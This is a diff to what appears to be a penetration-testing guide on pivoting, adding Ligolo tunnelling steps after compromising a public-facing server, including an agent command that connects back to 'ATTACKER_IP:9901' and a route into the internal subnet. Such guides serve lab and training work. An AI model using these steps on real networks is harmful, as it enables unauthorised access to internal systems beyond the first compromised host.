@@ -79,6 +79,22 @@ TODO :)
 
 ### 1. Accessing the Target Network
 
-Once you have a reverse shell or ssh access to the Public Facing Server that is in the Target Network, you realize that there is a second target in the same network which you wish to access/enumerate or exploit any vulnerabilities. To do that, you must first identify the Target Network Sub network and inject a IP route into the Ligolo TUN interface as show previously
+Once you have gained access to the Public Facing Server that is in the Target Network, you can to access/enumerate or exploit any vulnerabilities against a different target in the same network using the very own tools from the attacking machine.
 
-TODO
+```
+# 1. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs
+
+# 2. Initiate a connection from the ligolo agent to the ligolo proxy
+./agent -connect ATTACKER_IP:9901
+
+# 1. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
+sudo ip route add 192.168.0.0/24 dev ligolo
+
+# 2. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)
+
+# 3. Once selected, type : 
+Start
+
+//This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel.
+```
+![image](https://user-images.githubusercontent.com/90450439/221321355-726da2ad-6064-462d-aaa2-dda9265284d2.png)
